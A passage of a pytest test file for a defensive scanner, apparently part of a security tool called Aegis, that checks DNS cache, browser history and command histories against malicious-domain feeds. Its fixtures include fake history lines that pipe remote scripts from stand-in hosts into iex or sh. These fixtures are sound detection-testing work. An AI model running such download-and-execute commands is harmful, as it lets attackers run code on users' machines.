    {"Entry": "www.good.example", "Name": "www.good.example", "Data": "198.51.100.7", "Type": 1},
    {"Entry": "evil.example", "Name": "evil.example", "Data": IP, "Type": 1},
    {"Entry": "cdn.evil.example", "Name": "cdn.evil.example", "Data": "2606:4700:4700::1111", "Type": 28},
    {"Entry": "lookalike.example", "Name": "lookalike.example", "Data": "203.0.113.50", "Type": 1},
    {"Entry": "www.shop.example", "Name": "www.shop.example", "Data": "tracker.evil.example", "Type": 5},
    {"Entry": "37.1.168.192.in-addr.arpa", "Name": "37.1.168.192.in-addr.arpa", "Data": "host.lan", "Type": 12},
    {"Entry": "plain.example", "Name": "plain.example", "Data": None, "Type": 1},
    "not a dict", None,
]


def test_parse_dns_cache_types_and_shapes():
    recs = tr.parse_dns_cache(DNS_ROWS)
    assert len(recs) == 7 and recs[0] == tr.DnsRecord("www.good.example", "www.good.example", "198.51.100.7", "A")
    assert [r.rtype for r in recs] == ["A", "A", "AAAA", "A", "CNAME", "PTR", "A"] and recs[-1].data == ""
    assert tr.parse_dns_cache({"entry": "a.example", "NAME": "a.example", "Data": "1.2.3.4", "type": "a"})[0].rtype == "A"
    assert tr.parse_dns_cache({"Entry": "a.example", "Type": 99})[0].rtype == "99"
    assert tr.parse_dns_cache(None) == [] and tr.parse_dns_cache([]) == [] and tr.parse_dns_cache("junk") == []


def test_find_dns_hits_domains_subdomains_ips_and_cname_targets():
    sigs = FakeSigs(["evil.example"], [IP, "2606:4700:4700::1111"])
    hits = {h.domain: h for h in tr.find_dns_hits(tr.parse_dns_cache(DNS_ROWS), sigs)}
    assert set(hits) == {"evil.example", "cdn.evil.example", "tracker.evil.example"}
    assert hits["evil.example"].listed_domain and hits["evil.example"].ips == [IP]
    assert hits["cdn.evil.example"].listed_domain and hits["cdn.evil.example"].ips == ["2606:4700:4700::1111"]  # sub-domain
    assert hits["tracker.evil.example"].listed_domain and hits["tracker.evil.example"].looked_up_as == ["www.shop.example"]
    assert "lookalike.example" not in hits and "www.good.example" not in hits
    only_ip = tr.find_dns_hits(tr.parse_dns_cache(DNS_ROWS), FakeSigs(["unrelated.example"], [IP]))
    assert [(h.domain, h.listed_domain, h.ips) for h in only_ip] == [("evil.example", False, [IP])]
    assert tr.find_dns_hits([], sigs) == [] and tr.find_dns_hits(tr.parse_dns_cache(DNS_ROWS), FakeSigs(["x.example"])) == []


def test_dns_finding_for_a_listed_domain():
    f = tr.dns_finding(tr.DnsHit("evil.example", True, [IP], ["www.shop.example"]))
    assert f.rule_id == "AEG-TRACE-DNS" and f.severity == Severity.HIGH and f.category == Category.NETWORK
    assert f.title == "This PC recently contacted a known-malicious domain: evil.example"
    assert f.location == "dns-cache:evil.example" and f.mitre == ["T1071"] and f.remediation is None
    assert IP in f.description and "www.shop.example" in f.description and "does not show which program" in f.description
    assert "Task Manager" in f.recommendation and "full Aegis scan" in f.recommendation
    assert f.evidence == {"domain": "evil.example", "on_domain_feed": True, "malicious_ips": [IP], "looked_up_as": ["www.shop.example"]}


def test_dns_finding_for_a_malicious_address_only():
    f = tr.dns_finding(tr.DnsHit("innocent.example", False, [IP]))
    assert f.title == f"This PC recently contacted a known-malicious server: innocent.example ({IP})"
    assert f.location == "dns-cache:innocent.example" and f.mitre == ["T1071", "T1568"] and f.evidence["on_domain_feed"] is False


def test_check_dns_cache_flow(ctx, monkeypatch):
    ctx.signatures.bad_domains.add("evil.example")
    ctx.signatures.bad_ips.add(IP)
    calls = []

    def fake_json(script, timeout=90):
        calls.append((script, timeout))
        return list(DNS_ROWS)

    monkeypatch.setattr(tr, "IS_WINDOWS", True)
    monkeypatch.setattr(tr, "powershell_json", fake_json)
    findings, checks = split(tr.check_dns_cache(ctx))
    assert [f.location for f in findings] == ["dns-cache:cdn.evil.example", "dns-cache:evil.example", "dns-cache:tracker.evil.example"]
    assert len(set(f.fingerprint for f in findings)) == 3 and all(f.severity == Severity.HIGH for f in findings)
    assert checks[0].check_id == "AEG-TRACE-DNS" and checks[0].status == CheckStatus.FAIL and checks[0].category == Category.NETWORK
    assert "7 cached DNS records checked: 3 known-malicious domains or servers" in checks[0].detail
    assert calls == [(tr.DNS_SCRIPT, 60)] and "Get-DnsClientCache" in tr.DNS_SCRIPT and "ConvertTo-Json" in tr.DNS_SCRIPT
    assert ctx.stats["traces_dns_entries"] == 7 and ctx.stats["traces_flagged"] == 3


def test_check_dns_cache_clean_single_record_and_empty(ctx, monkeypatch):
    ctx.signatures.bad_domains.add("evil.example")
    monkeypatch.setattr(tr, "IS_WINDOWS", True)
    monkeypatch.setattr(tr, "powershell_json", lambda *a, **k: {"Entry": "a.example", "Name": "a.example", "Data": "1.2.3.4", "Type": 1})
    findings, checks = split(tr.check_dns_cache(ctx))
    assert findings == [] and checks[0].status == CheckStatus.PASS and "1 cached DNS record checked; none" in checks[0].detail
    monkeypatch.setattr(tr, "powershell_json", lambda *a, **k: [])
    findings, checks = split(tr.check_dns_cache(ctx))
    assert findings == [] and checks[0].status == CheckStatus.PASS and "0 cached DNS records" in checks[0].detail


def test_check_dns_cache_skips(ctx, monkeypatch):
    monkeypatch.setattr(tr, "IS_WINDOWS", False)
    findings, checks = split(tr.check_dns_cache(ctx))
    assert checks[0].status == CheckStatus.SKIP and "no system-wide DNS cache" in checks[0].detail
    monkeypatch.setattr(tr, "IS_WINDOWS", True)
    called = []
    monkeypatch.setattr(tr, "powershell_json", lambda *a, **k: called.append(1))
    assert not ctx.signatures.bad_domains
    findings, checks = split(tr.check_dns_cache(ctx))  # no feed: SKIP, and PowerShell is not even started
    assert findings == [] and checks[0].status == CheckStatus.SKIP and "aegis update" in checks[0].detail and not called
    ctx.signatures.bad_domains.add("evil.example")
    findings, checks = split(tr.check_dns_cache(ctx))  # PowerShell failed
    assert findings == [] and checks[0].status == CheckStatus.SKIP and "could not be read" in checks[0].detail and called


def test_check_dns_cache_caps_the_findings(ctx, monkeypatch):
    ctx.signatures.bad_domains.add("evil.example")
    rows = [{"Entry": f"h{i}.evil.example", "Name": f"h{i}.evil.example", "Data": "1.2.3.4", "Type": 1} for i in range(130)]
    monkeypatch.setattr(tr, "IS_WINDOWS", True)
    monkeypatch.setattr(tr, "powershell_json", lambda *a, **k: rows)
    findings, checks = split(tr.check_dns_cache(ctx))
    assert len(findings) == tr.MAX_DNS_FINDINGS == 100 and "Only the first 100 are reported" in checks[0].detail


# =========================================================================== 5. Browser history
def webkit(when):
    return int((when - dt.datetime(1601, 1, 1, tzinfo=UTC)).total_seconds()) * 1_000_000


def unixus(when):
    return int(when.timestamp()) * 1_000_000


CHROMIUM_SCHEMA = ("CREATE TABLE urls (id INTEGER PRIMARY KEY AUTOINCREMENT, url LONGVARCHAR, title LONGVARCHAR, "
                   "visit_count INTEGER DEFAULT 0 NOT NULL, typed_count INTEGER DEFAULT 0 NOT NULL, "
                   "last_visit_time INTEGER NOT NULL, hidden INTEGER DEFAULT 0 NOT NULL)")
FIREFOX_SCHEMA = ("CREATE TABLE moz_places (id INTEGER PRIMARY KEY, url LONGVARCHAR, title LONGVARCHAR, rev_host LONGVARCHAR, "
                  "visit_count INTEGER DEFAULT 0, hidden INTEGER DEFAULT 0 NOT NULL, typed INTEGER DEFAULT 0 NOT NULL, "
                  "frecency INTEGER DEFAULT -1 NOT NULL, last_visit_date INTEGER, guid TEXT, foreign_count INTEGER DEFAULT 0 NOT NULL)")


def make_history(path, family, rows):
    """A real history database (replacing any earlier file). rows: (url, when, visit_count)."""
    if path.exists():
        path.unlink()
    with closing(sqlite3.connect(str(path))) as con:
        if family == "firefox":
            con.execute(FIREFOX_SCHEMA)
            con.executemany("INSERT INTO moz_places (url, title, visit_count, last_visit_date) VALUES (?, 'Private page title', ?, ?)",
                            [(u, n, unixus(w) if w else None) for u, w, n in rows])
        else:
            con.execute(CHROMIUM_SCHEMA)
            con.executemany("INSERT INTO urls (url, title, visit_count, last_visit_time) VALUES (?, 'Private page title', ?, ?)",
                            [(u, n, webkit(w) if w else 0) for u, w, n in rows])
        con.commit()
    return path


def profile_of(tmp_path, family="chromium", name="Default", rows=(), browser="Google Chrome"):
    folder = tmp_path / browser.replace(" ", "_") / name
    folder.mkdir(parents=True, exist_ok=True)
    prof = tr.BrowserProfile(browser, family, name, folder)
    make_history(prof.history, family, list(rows))
    return prof


def ago(**kw):
    return NOW - dt.timedelta(**kw)


SINCE = NOW - dt.timedelta(days=30)


@pytest.mark.parametrize("family", ["chromium", "firefox"])
def test_read_history_rows_converts_times_and_applies_the_window(tmp_path, family):
    rows = [("https://new.example/a", ago(hours=1), 3), ("https://mid.example/b?x=1", ago(days=29, hours=23), 1),
            ("https://old.example/c", ago(days=31), 9), ("https://never.example/d", None, 1),
            ("chrome://settings", ago(hours=2), 1), ("file:///etc/passwd", ago(hours=3), 1), ("ftp://f.example/x", ago(hours=4), 2)]
    prof = profile_of(tmp_path, family, rows=rows)
    got = tr.read_history_rows(prof, SINCE)
    assert [(r.url, r.when, r.visits) for r in got] == [  # newest first, only web addresses inside the 30 days
        ("https://new.example/a", ago(hours=1), 3), ("ftp://f.example/x", ago(hours=4), 2),
        ("https://mid.example/b?x=1", ago(days=29, hours=23), 1)]
    assert [r.url for r in tr.read_history_rows(prof, SINCE, limit=1)] == ["https://new.example/a"]
    assert len(tr.read_history_rows(prof, NOW - dt.timedelta(days=40))) == 4


def test_read_history_rows_never_touches_the_original_file(tmp_path):
    prof = profile_of(tmp_path, rows=[("https://a.example/x", ago(hours=1), 1)])
    before = prof.history.read_bytes()
    tr.read_history_rows(prof, SINCE)
    assert prof.history.read_bytes() == before
    assert sorted(p.name for p in prof.history.parent.iterdir()) == ["History"]  # no journal / copy left in the profile


def test_read_history_rows_includes_the_write_ahead_log(tmp_path):
    folder = tmp_path / "ff"
    folder.mkdir()
    prof = tr.BrowserProfile("Mozilla Firefox", "firefox", "default", folder)
    writer = sqlite3.connect(str(prof.history))
    try:
        writer.execute("PRAGMA journal_mode=WAL")
        writer.execute("PRAGMA wal_autocheckpoint=0")
        writer.execute(FIREFOX_SCHEMA)
        writer.execute("INSERT INTO moz_places (url, visit_count, last_visit_date) VALUES ('https://old.example/a', 1, ?)",
                       (unixus(ago(days=2)),))
        writer.commit()
        writer.execute("INSERT INTO moz_places (url, visit_count, last_visit_date) VALUES ('https://wal.example/b', 1, ?)",
                       (unixus(ago(hours=1)),))
        writer.commit()
        assert Path(str(prof.history) + "-wal").exists()  # the newest visit is only in the log, as in a running Firefox
        urls = [r.url for r in tr.read_history_rows(prof, SINCE)]
    finally:
        writer.close()
    assert urls == ["https://wal.example/b", "https://old.example/a"]


def test_read_history_rows_falls_back_when_the_copy_cannot_be_opened_read_only(tmp_path, monkeypatch):
    prof = profile_of(tmp_path, rows=[("https://a.example/x", ago(hours=1), 1)])
    real = sqlite3.connect
    modes = []

    def ro_fails(target, *args, **kwargs):
        modes.append("ro" if kwargs.get("uri") else "normal")
        if kwargs.get("uri"):
            raise sqlite3.OperationalError("unable to open database file")
        return real(target, *args, **kwargs)

    monkeypatch.setattr(tr.sqlite3, "connect", ro_fails)
    assert [r.url for r in tr.read_history_rows(prof, SINCE)] == ["https://a.example/x"]
    assert modes == ["ro", "normal"]
    assert [p.name for p in prof.history.parent.iterdir()] == ["History"]


def test_read_history_rows_errors_are_history_read_errors(tmp_path, monkeypatch):
    folder = tmp_path / "p"
    folder.mkdir()
    prof = tr.BrowserProfile("Google Chrome", "chromium", "Default", folder)
    with pytest.raises(tr.HistoryReadError, match="no history file"):
        tr.read_history_rows(prof, SINCE)
    prof.history.write_bytes(b"this is not a database" * 50)
    with pytest.raises(tr.HistoryReadError, match="not a readable history database"):
        tr.read_history_rows(prof, SINCE)
    # a real database of the wrong kind: right file name, other tables
    other = tr.BrowserProfile("Mozilla Firefox", "firefox", "default", folder)
    with closing(sqlite3.connect(str(other.history))) as con:
        con.execute("CREATE TABLE unrelated (a)")
        con.commit()
    with pytest.raises(tr.HistoryReadError, match="not a readable history database"):
        tr.read_history_rows(other, SINCE)
    make_history(prof.history, "chromium", [])

    def locked(path, folder_):
        raise PermissionError("locked")

    monkeypatch.setattr(tr, "_copy_database", locked)
    with pytest.raises(tr.HistoryReadError, match="locked"):
        tr.read_history_rows(prof, SINCE)

    def gone(path, folder_):
        raise FileNotFoundError(2, "No such file or directory")

    monkeypatch.setattr(tr, "_copy_database", gone)
    with pytest.raises(tr.HistoryReadError, match="could not be copied"):
        tr.read_history_rows(prof, SINCE)


def test_read_history_rows_respects_the_row_limit_constant(tmp_path):
    assert tr.BROWSER_ROW_LIMIT == 50_000 and tr.BROWSER_DAYS == 30 and tr.BROWSER_BUDGET_S == 60
    rows = [(f"https://h{i}.example/", ago(minutes=i), 1) for i in range(30)]
    prof = profile_of(tmp_path, rows=rows)
    assert len(tr.read_history_rows(prof, SINCE, limit=7)) == 7


def test_match_bad_host_walks_up_to_the_listed_domain():
    sigs = FakeSigs(["evil.example"], [IP])
    assert tr.match_bad_host("evil.example", sigs) == "evil.example"
    assert tr.match_bad_host("a.b.evil.example", sigs) == "evil.example"
    assert tr.match_bad_host("EVIL.example.", sigs) == "evil.example"
    assert tr.match_bad_host(IP, sigs) == IP and tr.match_bad_host("203.0.113.9", sigs) is None
    assert tr.match_bad_host("good.example", sigs) is None and tr.match_bad_host("", sigs) is None
    assert tr.match_bad_host("notevil.example", sigs) is None


def test_match_bad_host_works_with_the_real_signature_database(ctx):
    ctx.signatures.bad_domains.add("evil.example")
    ctx.signatures.bad_ips.add(IP)
    assert tr.match_bad_host("x.evil.example", ctx.signatures) == "evil.example"
    assert tr.match_bad_host(IP, ctx.signatures) == IP and tr.match_bad_host("good.example", ctx.signatures) is None


def row(url, when=None, visits=1):
    return tr.HistoryRow(url, when or ago(hours=1), visits)


def test_find_bad_sites_groups_by_listed_domain():
    sigs = FakeSigs(["evil.example"], [IP])
    rows = [row("https://a.evil.example/x?token=SECRETVALUE#f", ago(hours=1), 2), row("https://b.evil.example/y", ago(hours=5), 3),
            row("https://evil.example/z", ago(days=2)), row("https://evil.example/z", ago(days=3)),
            row(f"http://{IP}:8080/p?q=1", ago(hours=9)), row("https://good.example/", ago(hours=1)),
            row("http://[::1]/x"), row("https://%zz/bad"), row("https://evil.example/w1"), row("https://evil.example/w2")]
    examined, hits = tr.find_bad_sites(rows, sigs)
    assert examined == len(rows) and set(hits) == {"evil.example", IP}
    hit = hits["evil.example"]
    assert hit.urls == 6 and hit.visits == 2 + 3 + 1 + 1 + 1 + 1 and hit.last_visit == ago(hours=1)
    assert hit.examples == ["https://a.evil.example/x", "https://b.evil.example/y", "https://evil.example/z"]  # 3 at most, no query
    assert hits[IP].examples == [f"http://{IP}:8080/p"] and hits[IP].urls == 1
    assert "SECRETVALUE" not in json.dumps([h.examples for h in hits.values()])
    assert tr.find_bad_sites([], sigs) == (0, {})


def test_site_finding():
    prof = tr.BrowserProfile("Google Chrome", "chromium", "Profile 1 (Work)", Path("/home/bob/.config/google-chrome/Profile 1"))
    hit = tr.SiteHit("evil.example", 3, 7, ago(hours=2), ["https://evil.example/a.exe", "https://evil.example/b"])
    f = tr.site_finding(prof, hit)
    assert f.rule_id == "AEG-TRACE-BROWSER" and f.severity == Severity.HIGH and f.category == Category.BROWSER
    assert f.title == "Browser visited a known-malicious site: evil.example"
    assert f.location == f"{prof.path}#evil.example" and f.mitre == ["T1189", "T1566.002"] and f.remediation is None
    assert "7 visits" in f.description and "2026-10-16 10:00 UTC" in f.description and "last 30 days" in f.description
    assert f.evidence == {"browser": "Google Chrome", "profile": "Profile 1 (Work)", "profile_path": str(prof.path),
                          "domain": "evil.example", "visit_count": 7, "urls_visited": 3, "last_visit": "2026-10-16T10:00:00+00:00",
                          "example_urls": ["https://evil.example/a.exe", "https://evil.example/b"], "window_days": 30}
    assert "downloaded or ran a file" in f.recommendation and "aegis protect web" in f.recommendation
    one = tr.site_finding(prof, tr.SiteHit("evil.example", 1, 1, None, []))
    assert "1 visit " in one.description and "most recently" not in one.description and one.evidence["last_visit"] is None


# discovery with fake trees
def test_discover_browser_profiles_uses_the_browser_scanners_discovery(tmp_path):
    cfg = tmp_path / ".config"
    for rel in ("google-chrome/Default", "google-chrome/Profile 2", "chromium/Default"):
        (cfg / rel).mkdir(parents=True)
        (cfg / rel / "Preferences").write_text("{}", encoding="utf-8")
    (cfg / "google-chrome" / "Local State").write_text(
        json.dumps({"profile": {"info_cache": {"Profile 2": {"name": "Work"}}}}), encoding="utf-8")
    (cfg / "opera").mkdir()  # Opera keeps its single profile directly in the folder
    (cfg / "opera" / "Preferences").write_text("{}", encoding="utf-8")
    ff = tmp_path / ".mozilla" / "firefox"
    (ff / "abc.default-release").mkdir(parents=True)
    (ff / "profiles.ini").write_text("[Profile0]\nName=default-release\nIsRelative=1\nPath=abc.default-release\n", encoding="utf-8")
    (cfg / "brave-ghost").mkdir()  # not a browser location
    found = tr.discover_browser_profiles("linux", tmp_path, {})
    got = {(p.browser, p.family, p.label, p.path) for p in found}
    assert got == {
        ("Google Chrome", "chromium", "Default", cfg / "google-chrome" / "Default"),
        ("Google Chrome", "chromium", "Profile 2 (Work)", cfg / "google-chrome" / "Profile 2"),
        ("Chromium", "chromium", "Default", cfg / "chromium" / "Default"),
        ("Opera", "chromium", "Default", cfg / "opera"),
        ("Mozilla Firefox", "firefox", "default-release", ff / "abc.default-release")}
    by_label = {(p.browser, p.label): p for p in found}
    assert by_label[("Opera", "Default")].history == cfg / "opera" / "History"
    assert by_label[("Google Chrome", "Default")].history == cfg / "google-chrome" / "Default" / "History"
    assert by_label[("Mozilla Firefox", "default-release")].history == ff / "abc.default-release" / "places.sqlite"
    assert tr.discover_browser_profiles("linux", tmp_path / "nobody", {}) == []


def test_discover_browser_profiles_windows_and_mac_layouts(tmp_path):
    local = tmp_path / "Local"
    (local / "Microsoft" / "Edge" / "User Data" / "Default").mkdir(parents=True)
    (local / "Microsoft" / "Edge" / "User Data" / "Default" / "Preferences").write_text("{}", encoding="utf-8")
    roam = tmp_path / "Roaming"
    (roam / "Opera Software" / "Opera Stable").mkdir(parents=True)
    (roam / "Opera Software" / "Opera Stable" / "Preferences").write_text("{}", encoding="utf-8")
    found = tr.discover_browser_profiles("windows", tmp_path, {"LOCALAPPDATA": str(local), "APPDATA": str(roam)})
    assert {p.browser for p in found} == {"Microsoft Edge", "Opera"}
    sup = tmp_path / "Library" / "Application Support" / "BraveSoftware" / "Brave-Browser" / "Default"
    sup.mkdir(parents=True)
    (sup / "Preferences").write_text("{}", encoding="utf-8")
    assert [p.browser for p in tr.discover_browser_profiles("darwin", tmp_path, {})] == ["Brave"]


# the check
def make_browser_world(ctx, tmp_path, monkeypatch):
    ctx.signatures.bad_domains.add("evil.example")
    ctx.signatures.bad_ips.add(IP)
    chrome = profile_of(tmp_path, "chromium", "Default", browser="Google Chrome", rows=[
        ("https://a.evil.example/dl/setup.exe?id=SECRETVALUE", ago(hours=1), 4), ("https://good.example/private/page", ago(hours=2), 1),
        ("https://evil.example/old", ago(days=45), 1)])
    work = profile_of(tmp_path, "chromium", "Profile 1", browser="Google Chrome", rows=[
        (f"http://{IP}/x", ago(days=3), 1), ("https://good.example/other", ago(hours=1), 1)])
    firefox = profile_of(tmp_path, "firefox", "default", browser="Mozilla Firefox", rows=[
        ("https://news.example/story", ago(hours=1), 1), ("https://evil.example/captcha.html?x=1", ago(hours=6), 2)])
    monkeypatch.setattr(tr, "discover_browser_profiles", lambda: [chrome, work, firefox])
    return chrome, work, firefox


def test_check_browser_history_flow(ctx, tmp_path, monkeypatch):
    chrome, work, firefox = make_browser_world(ctx, tmp_path, monkeypatch)
    findings, checks = split(tr.check_browser_history(ctx))
    assert [(f.location, f.severity.name) for f in findings] == [
        (f"{chrome.path}#evil.example", "HIGH"), (f"{work.path}#{IP}", "HIGH"), (f"{firefox.path}#evil.example", "HIGH")]
    assert [f.evidence["browser"] for f in findings] == ["Google Chrome", "Google Chrome", "Mozilla Firefox"]
    assert findings[0].evidence["example_urls"] == ["https://a.evil.example/dl/setup.exe"] and findings[0].evidence["visit_count"] == 4
    assert findings[2].evidence["visit_count"] == 2 and findings[2].evidence["example_urls"] == ["https://evil.example/captcha.html"]
    assert checks[0].check_id == "AEG-TRACE-BROWSER" and checks[0].status == CheckStatus.FAIL and checks[0].category == Category.BROWSER
    assert "3 of 3 browser profiles read, 6 addresses visited in the last 30 days checked: 3 known-malicious sites" in checks[0].detail
    blob = dump(findings) + dump(checks)
    for private in ("SECRETVALUE", "good.example", "news.example", "Private page title", "id="):
        assert private not in blob, private  # never the browsing history, query strings or page titles
    assert ctx.stats["traces_browser_rows"] == 6 and ctx.stats["traces_flagged"] == 3


def test_check_browser_history_findings_are_stable_between_scans(ctx, tmp_path, monkeypatch):
    make_browser_world(ctx, tmp_path, monkeypatch)
    first = [f.fingerprint for f in split(tr.check_browser_history(ctx))[0]]
    second = [f.fingerprint for f in split(tr.check_browser_history(ctx))[0]]
    assert first == second and len(set(first)) == 3


def test_check_browser_history_clean_profiles_pass(ctx, tmp_path, monkeypatch):
    ctx.signatures.bad_domains.add("evil.example")
    prof = profile_of(tmp_path, rows=[("https://good.example/", ago(hours=1), 1), ("https://evil.example/old", ago(days=60), 1)])
    monkeypatch.setattr(tr, "discover_browser_profiles", lambda: [prof])
    findings, checks = split(tr.check_browser_history(ctx))
    assert findings == [] and checks[0].status == CheckStatus.PASS and "none is on a threat feed" in checks[0].detail


def test_check_browser_history_without_a_feed_does_not_open_any_history(ctx, tmp_path, monkeypatch):
    assert not ctx.signatures.bad_domains

    def must_not_run(*a, **k):
        raise AssertionError("history must not be read without a feed")

    monkeypatch.setattr(tr, "discover_browser_profiles", must_not_run)
    monkeypatch.setattr(tr, "read_history_rows", must_not_run)
    findings, checks = split(tr.check_browser_history(ctx))
    assert findings == [] and checks[0].status == CheckStatus.SKIP and checks[0].check_id == "AEG-TRACE-BROWSER"
    assert "No malicious-domain feed is loaded" in checks[0].detail and "`aegis update`" in checks[0].detail


def test_check_browser_history_with_no_browsers(ctx, monkeypatch):
    ctx.signatures.bad_domains.add("evil.example")
    monkeypatch.setattr(tr, "discover_browser_profiles", lambda: [])
    findings, checks = split(tr.check_browser_history(ctx))
    assert findings == [] and checks[0].status == CheckStatus.SKIP and "No browser profile found" in checks[0].detail


def test_check_browser_history_reports_unreadable_profiles_and_keeps_going(ctx, tmp_path, monkeypatch):
    chrome, work, firefox = make_browser_world(ctx, tmp_path, monkeypatch)
    real = tr.read_history_rows

    def locked_first(profile, since, limit=tr.BROWSER_ROW_LIMIT):
        if profile is chrome:
            raise tr.HistoryReadError("the file is locked (close the browser and scan again)")
        return real(profile, since, limit)

    monkeypatch.setattr(tr, "read_history_rows", locked_first)
    findings, checks = split(tr.check_browser_history(ctx))
    assert [f.location for f in findings] == [f"{work.path}#{IP}", f"{firefox.path}#evil.example"]
    assert "2 of 3 browser profiles read" in checks[0].detail and "Google Chrome [Default]: the file is locked" in checks[0].detail
    assert checks[0].status == CheckStatus.FAIL


def test_check_browser_history_time_budget(ctx, tmp_path, monkeypatch):
    chrome, work, firefox = make_browser_world(ctx, tmp_path, monkeypatch)
    clock = itertools.chain([0.0, 0.0, 0.0, 100.0], itertools.repeat(100.0))  # budget is read at 0; the 3rd check is past 60 s
    monkeypatch.setattr(tr, "time", SimpleNamespace(monotonic=lambda: next(clock)))
    findings, checks = split(tr.check_browser_history(ctx))
    assert len(findings) == 2 and "time budget of 60 s reached, 1 profile(s) not examined" in checks[0].detail
    assert "2 of 3 browser profiles read" in checks[0].detail


def test_check_browser_history_budget_can_be_set(ctx, tmp_path, monkeypatch):
    make_browser_world(ctx, tmp_path, monkeypatch)
    ctx.options["traces_browser_budget_s"] = 5
    clock = itertools.chain([0.0], itertools.repeat(10.0))
    monkeypatch.setattr(tr, "time", SimpleNamespace(monotonic=lambda: next(clock)))
    findings, checks = split(tr.check_browser_history(ctx))
    assert findings == [] and "time budget of 5 s reached, 3 profile(s) not examined" in checks[0].detail


def test_check_browser_history_stops_when_cancelled(ctx, tmp_path, monkeypatch):
    make_browser_world(ctx, tmp_path, monkeypatch)
    ctx.cancel.set()
    assert list(tr.check_browser_history(ctx)) == []


def test_check_browser_history_caps_findings(ctx, tmp_path, monkeypatch):
    ctx.signatures.bad_domains.update({f"bad{i}.example" for i in range(130)})
    prof = profile_of(tmp_path, rows=[(f"https://bad{i}.example/", ago(minutes=i), 1) for i in range(130)])
    monkeypatch.setattr(tr, "discover_browser_profiles", lambda: [prof])
    findings, checks = split(tr.check_browser_history(ctx))
    assert len(findings) == tr.MAX_SITE_FINDINGS == 100 and checks[0].status == CheckStatus.FAIL


# =========================================================================== the scanner
def fake_traces_world(ctx, tmp_path, monkeypatch):
    ctx.signatures.bad_domains.add("evil.example")
    ctx.signatures.bad_ips.add(IP)
    monkeypatch.setattr(tr, "IS_WINDOWS", True)
    monkeypatch.setattr(tr, "read_runmru", lambda: dict(RUN_VALUES))
    monkeypatch.setattr(tr, "read_runmru_last_write", lambda: NOW)
    ps = write_lines(tmp_path / "ConsoleHost_history.txt", ["Get-Date", "iex (irm https://evil.example/a.ps1)"])
    monkeypatch.setattr(tr, "powershell_history_files", lambda: [ps])
    monkeypatch.setattr(tr, "powershell_json", lambda *a, **k: list(DNS_ROWS))
    prof = profile_of(tmp_path, rows=[("https://evil.example/x?k=SECRETVALUE", ago(hours=1), 1)])
    monkeypatch.setattr(tr, "discover_browser_profiles", lambda: [prof])
    return ps, prof


def test_scanner_run_smoke_with_fake_data(ctx, tmp_path, monkeypatch):
    fake_traces_world(ctx, tmp_path, monkeypatch)
    messages = []
    ctx.progress = lambda scanner, msg: messages.append((scanner, msg))
    out = list(tr.TracesScanner().run(ctx))
    findings, checks = split(out)
    assert [(c.check_id, c.status) for c in checks] == [
        ("AEG-TRACE-RUNMRU", CheckStatus.FAIL), ("AEG-TRACE-PSHISTORY", CheckStatus.FAIL), ("AEG-TRACE-SHELLHISTORY", CheckStatus.SKIP),
        ("AEG-TRACE-DNS", CheckStatus.FAIL), ("AEG-TRACE-BROWSER", CheckStatus.FAIL)]
    assert sorted((f.rule_id, f.severity.name) for f in findings) == sorted(
        [("AEG-TRACE-RUNMRU", "CRITICAL"), ("AEG-TRACE-RUNMRU", "HIGH"), ("AEG-TRACE-PSHISTORY", "HIGH"),
         ("AEG-TRACE-DNS", "HIGH"), ("AEG-TRACE-DNS", "HIGH"), ("AEG-TRACE-DNS", "HIGH"), ("AEG-TRACE-BROWSER", "HIGH")])
    for f in findings:
        assert f.title and f.description and f.location and f.evidence and f.recommendation and f.mitre, f.rule_id
        assert f.remediation is None and f.category in (Category.SUSPICIOUS, Category.NETWORK, Category.BROWSER)
        json.dumps(f.to_dict())
    assert {f.rule_id: f.category for f in findings} == {
        "AEG-TRACE-RUNMRU": Category.SUSPICIOUS, "AEG-TRACE-PSHISTORY": Category.SUSPICIOUS, "AEG-TRACE-DNS": Category.NETWORK,
        "AEG-TRACE-BROWSER": Category.BROWSER}
    assert "SECRETVALUE" not in dump(out)
    assert len([m for m in messages if m[0] == "traces" and m[1].startswith(("reading", "checking"))]) >= 5
    assert {"traces_run_entries", "traces_history_lines", "traces_dns_entries", "traces_browser_rows"} <= set(ctx.stats)


def test_scanner_run_all_clean(ctx, tmp_path, monkeypatch):
    ctx.signatures.bad_domains.add("evil.example")
    monkeypatch.setattr(tr, "IS_WINDOWS", True)
    monkeypatch.setattr(tr, "read_runmru", lambda: {"a": "notepad\\1", "MRUList": "a"})
    ps = write_lines(tmp_path / "ConsoleHost_history.txt", ["Get-Date", "iwr https://astral.sh/uv/install.ps1 | iex"])
    monkeypatch.setattr(tr, "powershell_history_files", lambda: [ps])
    monkeypatch.setattr(tr, "powershell_json", lambda *a, **k: [DNS_ROWS[0]])
    prof = profile_of(tmp_path, rows=[("https://good.example/", ago(hours=1), 1)])
    monkeypatch.setattr(tr, "discover_browser_profiles", lambda: [prof])
    findings, checks = split(tr.TracesScanner().run(ctx))
    assert findings == []
    assert [(c.check_id, c.status) for c in checks] == [
        ("AEG-TRACE-RUNMRU", CheckStatus.PASS), ("AEG-TRACE-PSHISTORY", CheckStatus.PASS), ("AEG-TRACE-SHELLHISTORY", CheckStatus.SKIP),
        ("AEG-TRACE-DNS", CheckStatus.PASS), ("AEG-TRACE-BROWSER", CheckStatus.PASS)]


def test_scanner_on_linux_skips_the_windows_checks(ctx, tmp_path, monkeypatch):
    monkeypatch.setattr(tr, "IS_WINDOWS", False)
    bash = write_lines(tmp_path / ".bash_history", [f"curl -s http://{IP}/x | sh"])
    monkeypatch.setattr(tr, "unix_history_files", lambda: [("bash", bash)])
    monkeypatch.setattr(tr, "powershell_history_files", lambda: [])
    monkeypatch.setattr(tr, "discover_browser_profiles", lambda: [])
    findings, checks = split(tr.TracesScanner().run(ctx))
    assert [f.rule_id for f in findings] == ["AEG-TRACE-SHELLHISTORY"]
    status = {c.check_id: c.status for c in checks}
    assert status == {"AEG-TRACE-RUNMRU": CheckStatus.SKIP, "AEG-TRACE-PSHISTORY": CheckStatus.SKIP,
                      "AEG-TRACE-SHELLHISTORY": CheckStatus.FAIL, "AEG-TRACE-DNS": CheckStatus.SKIP, "AEG-TRACE-BROWSER": CheckStatus.SKIP}


def test_one_failing_check_does_not_stop_the_others(ctx, tmp_path, monkeypatch):
    fake_traces_world(ctx, tmp_path, monkeypatch)

    def boom(*a, **k):
        raise RuntimeError("registry exploded")

    monkeypatch.setattr(tr, "read_runmru", boom)
    monkeypatch.setattr(tr, "discover_browser_profiles", boom)
    findings, checks = split(tr.TracesScanner().run(ctx))
    status = {c.check_id: c for c in checks}
